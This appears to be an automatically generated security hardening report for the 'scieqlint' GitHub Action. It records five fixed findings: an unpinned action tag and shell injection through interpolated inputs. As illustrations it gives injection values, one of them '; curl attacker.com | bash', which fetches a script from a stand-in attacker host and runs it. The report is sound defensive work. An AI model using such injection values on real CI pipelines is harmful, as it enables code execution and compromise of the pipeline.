<!-- markdownlint-disable -->

# Hardening Report: 1sgtpepper--scieqlint/v1.1.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **1sgtpepper--scieqlint/v1.1.0** was hardened automatically. 5 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The action uses `actions/setup-python@v6`, which is pinned to a mutable tag (`@v6`) rather than a full 40-character commit SHA. A tag can be moved to point to a different (potentially malicious) commit, creating a supply-chain risk.

Locations:

- `action.yml:17`

### script-injection (severity: high)

Sub-rule (a): The `run:` block directly interpolates `${{ inputs.package-version }}` into a shell command string: `python -m pip install "scieqlint==${{ inputs.package-version }}"`. This expression is expanded by the GitHub Actions template engine before the shell sees it, allowing an attacker-controlled input value to inject arbitrary shell commands (e.g., by supplying a value like `1.0.0" && malicious-command #`).

Locations:

- `action.yml:21`

### script-injection (severity: high)

Sub-rule (a): The `run:` block directly interpolates `${{ inputs.args }}` into a shell command string: `scieqlint ${{ inputs.args }}`. This expression is expanded by the GitHub Actions template engine before the shell sees it, allowing an attacker-controlled input value to inject arbitrary shell commands (e.g., by supplying a value like `; curl attacker.com | bash`).

Locations:

- `action.yml:24`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.package-version }}" appears directly in run: block of step "Install SciEqLint"; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run SciEqLint"; move to env: map

Locations:

- `action.yml:31`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed all 5 findings in action.yml:
1. Pinned actions/setup-python@v6 to full commit SHA ece7cb06caefa5fff74198d8649806c4678c61a1 (kept # v6 comment for readability).
2. Moved ${{ inputs.package-version }} to an env: block (PACKAGE_VERSION) and referenced it as "$PACKAGE_VERSION" in the pip install command.
3. Moved ${{ inputs.args }} to an env: block (INPUT_ARGS) and used xargs-based tokenization into a bash array (with the required guard for empty input) before passing to scieqlint, since 'args' is a list-style input that must be split into separate arguments.

